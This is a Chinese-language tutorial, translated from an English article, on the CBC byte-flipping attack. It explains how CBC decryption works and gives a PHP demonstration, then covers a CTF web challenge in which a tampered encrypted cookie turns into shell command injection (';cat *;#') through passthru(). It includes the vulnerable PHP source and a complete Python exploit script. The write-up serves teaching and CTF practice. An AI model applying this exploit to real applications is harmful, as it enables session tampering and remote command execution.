# CBC字节翻转攻击-101Approach

0x00 译者前言
=========

* * *

本文翻译自：[http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/](http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/)

drops里的相关主题文章：[使用CBC比特反转攻击绕过加密的会话令牌](http://drops.wooyun.org/tips/4975)

缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。

0x01 相关介绍
=========

* * *

此攻击方法的精髓在于：**通过损坏密文字节来改变明文字节**。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。

首先让我们看看CBC是如何工作的，（作者很懒所以）更多细节你可以看这里：[wiki](http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)

在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）

**加密过程**

![enter image description here](http://drops.javaweb.org/uploads/images/016921e74bbeb0584b7050ea0323d6db4023ac4a.jpg)

**Plaintext**：待加密的数据。

**IV**：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。

**Key**：被一些如AES的对称加密算法使用。

**Ciphertext**：加密后的数据。

在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为_块_。在本文中，我们将使用包含16字节的块。

因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：

*   _Ciphertext-0 = Encrypt(Plaintext XOR IV)_—只用于第一个组块
*   _Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)_—用于第二及剩下的组块

注意：正如你所见，**前一块的密文用来产生后一块的密文**。

**Decryption Process**

![enter image description here](http://drops.javaweb.org/uploads/images/b597d6474d286cb7f67d4f0df7ba85ba024c9025.jpg)

*   _Plaintext-0 = Decrypt(Ciphertext) XOR IV_—只用于第一个组块
*   _Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1_—用于第二及剩下的组块

注意：**_Ciphertext-N-1_（密文-N-1）是用来产生下一块明文**；这就是字节翻转攻击开始发挥作用的地方。如果我们改变_Ciphertext-N-1_（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！**You got it?**别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：

![enter image description here](http://drops.javaweb.org/uploads/images/157b4078de6a8615e7c4be958d4d89164f1810e9.jpg)

0x02 一个例子（CBC Blocks of 16 bytes）
=================================

* * *

比方说，我们有这样的明文序列：

`a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}`

我们的目标是将“`s:6`”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：

*   Block 1:`a:2:{s:4:"name";`
*   Block 2:`s:6:"sdsdsd";s:8`
*   Block 3:`:"greeting";s:20`
*   Block 4:`:"echo 'Hello sd`
*   Block 5:`sdsd!'";}`

因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。

有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，**只**会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：

*   [0] = s
*   [1](http://drops.wooyun.org/wp-content/uploads/2015/08/115.png)= :
*   [2](http://drops.wooyun.org/wp-content/uploads/2015/08/216.png)=6

因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。

1.  `$v = "a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}";`
2.  `$enc = @encrypt($v);`
3.  `$enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));`
4.  `$b = @decrypt($enc);`

运行这段代码后，我们可以将数字6变为7：

![enter image description here](http://drops.javaweb.org/uploads/images/a75845cbf1166e1cb36877f0c84ad28f5359df85.jpg)

但是我们在第3行中，是如何改变字节成为我们想要的值呢？

基于上述的解密过程，我们知道有，_A = Decrypt(Ciphertext)_与_B = Ciphertext-N-1_异或后最终得到_C = 6_。等价于：

```
C = A XOR B

```

所以，我们唯一不知道的值就是A（注：对于B，C来说）（_block cipher decryption_）;借由XOR，我们可以很轻易地得到A的值：

```
A = B XOR C

```

最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：

`A XOR B XOR C XOR "7"`会在块2的明文当中，偏移量为2的字节处得到7。

下面是相关原理实现的PHP源代码：

```
define('MY_AES_KEY', "abcdef0123456789");
function aes($data, $encrypt) {
    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
    $iv = "1234567891234567";
    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);
}

define('MY_MAC_LEN', 40);

function encrypt($data) {
    return aes($data, true);
}

function decrypt($data) {
    $data = rtrim(aes($data, false), "\0");
    return $data;
}
$v = "a:2:{s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";}";
echo "Plaintext before attack: $v\n";
$b = array();
$enc = array();
$enc = @encrypt($v);
$enc[2] =  chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));
$b = @decrypt($enc);
echo "Plaintext AFTER attack : $b\n";

```

0x03 一个练习
=========

* * *

光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。

下面提供了这个练习当中很重要的一部分源码：

![enter image description here](http://drops.javaweb.org/uploads/images/4be3a59aa623337a6c329a4606a2c246ee524b52.jpg)

其中，你在POST提交参数"name"的任何文本值之后，应用程序则会对应输出"Hello"加上最后提交的文本。但是有两件事情发生在消息打印之前：

1.  POST参数"name"值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array->greeting当中，最后加密该值来产生cookie。
2.  Array->greeting当中的内容被PHP函数passthru()执行。
3.  最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。

然后作者构造了一个POST"name"的值来注入字符串：

```
name = 'X' + ';cat *;#a'

```

首先作者添加了一个字符"X"，通过CBC翻转攻击将其替换成一个单引号，然后`;cat *;`命令将被执行，最后的`#`是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。

在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：

```
pos = 51;
val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
exploit = cookie[0:pos] + val + cookie[pos + 1:]

```

然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：

![enter image description here](http://drops.javaweb.org/uploads/images/a307d3d11ed50b0f3b36d6d031295be4adbb4b10.jpg)

首先，因为我们改变了第一块，所以在第二块中，黄色标记的"X"被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。

**如何完善**

我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个'z'：

```
name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16

```

在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！

0x04 相关参考
=========

* * *

1.  CRYPTO #2:[http://blog.gdssecurity.com/labs/tag/crypto](http://blog.gdssecurity.com/labs/tag/crypto)
2.  [http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/](http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/)
3.  [http://hardc0de.ru/2013/08/04/ebctf-web400/](http://hardc0de.ru/2013/08/04/ebctf-web400/)

0x05 附录代码
=========

* * *

下面是上面练习当中的PHP源码及exp：

**PHP code:**

```
ini_set('display_errors',1);
error_reporting(E_ALL);

define('MY_AES_KEY', "abcdef0123456789");
define('MY_HMAC_KEY',"1234567890123456" );
#define("FLAG","CENSORED");

function aes($data, $encrypt) {
$aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
$iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);
$iv = "1234567891234567";
mcrypt_generic_init($aes, MY_AES_KEY, $iv);
return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);
}

define('MY_MAC_LEN', 40);

function hmac($data) {
return hash_hmac('sha1', data, MY_HMAC_KEY);
}

function encrypt($data) {
return aes($data . hmac($data), true);
}

function decrypt($data) {
$data = rtrim(aes($data, false), "\0");
$mac = substr($data, -MY_MAC_LEN);
$data = substr($data, 0, -MY_MAC_LEN);
return hmac($data) === $mac ? $data : null;
}
$settings = array();
if (@$_COOKIE['settings']) {
echo @decrypt(base64_decode($_COOKIE['settings']));
$settings = unserialize(@decrypt(base64_decode($_COOKIE['settings'])));
}
if (@$_POST['name'] && is_string($_POST['name']) && strlen($_POST['name']) < 200) {
$settings = array(
'name' => $_POST['name'],
'greeting' => ('echo ' . escapeshellarg("Hello {$_POST['name']}!")),
);
setcookie('settings', base64_encode(@encrypt(serialize($settings))));
#setcookie('settings', serialize($settings));
}
$d = array();
if (@$settings['greeting']) {
passthru($settings['greeting']);
else {
echo "</pre>
<form action="\&quot;?\&quot;" method="\&quot;POST\&quot;">\n";
echo "
What is your name?

\n";
echo "<input type="\&quot;text\&quot;" name="\&quot;name\&quot;" />\n";
echo "<input type="\&quot;submit\&quot;" name="\&quot;submit\&quot;" value="\&quot;Submit\&quot;" />\n";
echo "</form>
<pre>
\n";
}
?>

```

**Exploit:**

```
#!/usr/bin/python
import requests
import sys
import urllib
from base64 import b64decode as dec
from base64 import b64encode as enc

url = 'http://192.168.184.133/ebctf/mine.php'

def Test(x):
    t = "echo 'Hello %s!'" % x
    s = 'a:2:{s:4:"name";s:%s:"%s";s:8:"greeting";s:%s:"%s";}%s' % (len(x),x,len(t),t, 'X'*40)
    for i in xrange(0,len(s),16):
        print s[i:i+16]
    print '\n'

def Pwn(s):
    global url
    s = urllib.quote_plus(enc(s))
    req = requests.get(url, cookies = {'settings' : s}).content
 #   if req.find('works') != -1:
    print req
  #  else:
   #     print '[-] FAIL'

def GetCookie(name):
    global url
    d = {
        'name':name,
        'submit':'Submit'
    }
    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
    if h.has_key('set-cookie'):
        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
        #h = urllib.unquote_plus(h['set-cookie'][9:])
        #print h
        return h
    else:
        print '[-] ERROR'
        sys.exit(0)

#a:2:{s:4:"name";s:10:"X;cat *;#a";s:8:"greeting";s:24:"echo 'Hello X;cat *;#a!'";}
#a:2:{s:4:"name";
#s:10:"X;cat *;#a
#";s:8:"greeting"
#;s:24:"echo 'Hel
#lo X;cat *;#a!'"
#;}

#a:2:{s:4:"name";s:42:"zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz";s:8:"greeting";s:56:"echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'";}
#a:2:{s:4:"name";
#s:42:"zzzzzzzzzz
#zzzzzzzX;cat *;#
#zzzzzzzzzzzzzzzz
#";s:8:"greeting"   
#;s:56:"echo 'Hel
#lo zzzzzzzzzzzzz
#zzzzX;cat *;#zzz
#zzzzzzzzzzzzz!'"
#;}
#exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success

#exploit = "______________________________________________________; cat *;#"
#Test(exploit)
cookie = GetCookie(exploit)
pos = 100; #test case success
#pos = 51; #test case first, unsuccess
val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
exploit = cookie[0:pos] + val + cookie[pos + 1:]
Pwn(exploit)

```